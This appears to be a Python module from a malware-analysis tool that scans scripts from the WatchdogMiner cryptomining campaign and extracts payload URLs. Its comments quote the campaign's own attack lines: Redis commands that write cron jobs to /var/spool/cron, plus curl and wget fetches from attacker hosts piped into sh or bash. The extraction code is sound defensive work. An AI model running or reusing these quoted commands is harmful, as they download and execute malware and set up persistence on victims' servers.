import os
import inspect

from mishell.shell_family import Alpha


class watchdogminer_scanner(Alpha):
    NAME = "watchdogminer_scanner"

    def __init__(self):
        super(watchdogminer_scanner, self).__init__()
        self.anchor_processor = {}
        self.file_abs_path = None
        self.lines = []
        self._inspect_anchor_processer()

    def do(self, data, *args, **kwargs):
        for file_abs_path, anchor_lst in data.items():
            md5 = os.path.basename(file_abs_path)
            self._read_file(file_abs_path)
            self._find(anchor_lst, md5)

    def get_process_result(self):
        pass

    def _read_file(self, file_abs_path):
        self.file_abs_path = file_abs_path
        with open(file_abs_path, "r") as f:
            self.lines = f.readlines()

    def _find(self, anchor_dct, md5):
        print("Processing md5 {}".format(md5))
        for anchor, value in anchor_dct.items():
            func = self.anchor_processor.get(anchor, None)
            if func is not None:
                func(anchor, value)

    def _inspect_anchor_processer(self):
        for name, data in inspect.getmembers(self):
            if name.startswith("anchor") and inspect.ismethod(data):
                self.anchor_processor[name] = data

    # echo 'set backup1 "\n\n\n*/2 * * * * cd1 -fsSL http://zzhreceive.anondns.net/b2f628/b.sh | sh\n\n"' >> .dat
    # echo 'set backup2 "\n\n\n*/3 * * * * wget -q -O- http://zzhreceive.anondns.net/b2f628/b.sh | sh\n\n"' >> .dat
    # echo 'set backup3 "\n\n\n*/4 * * * * curl -fsSL http://zzhreceive.anondns.net/b2f628fff19fda999999999/b.sh | sh\n\n"' >> .dat
    # echo 'set backup4 "\n\n\n*/5 * * * * wd1 -q -O- http://zzhreceive.anondns.net/b2f628fff19fda999999999/b.sh | sh\n\n"' >> .dat
    # echo 'config set dir "/var/spool/cron/"' >> .dat
    def anchor_backup(self, anchor, value):
        for line in self.lines:
            line = line.strip()
            if line.startswith(value):
                url = ""
                try:
                    raw = line.split("|")[0].split(" ")
                    for item in raw:
                        if item.startswith("http"):
                            url = item
                            break
                except Exception as e:
                    return
                if url == "":
                    continue
                print(f"anchor_backup: {url}")

    # bdir -fsSL http://45.9.148.37/b2f628fff19fda999999999/rs.sh | bash
    # $bbdira -fsSL http://45.9.148.37/b2f628fff19fda999999999/rs.sh | bash
    def anchor_bbdir(self, anchor, value):
        for line in self.lines:
            line = line.strip()
            if line.startswith(value):
                try:
                    url = line.split("|")[0].split(" ")[-2]
                except Exception as e:
                    return
                print(f"anchor_bbdir: {url}")
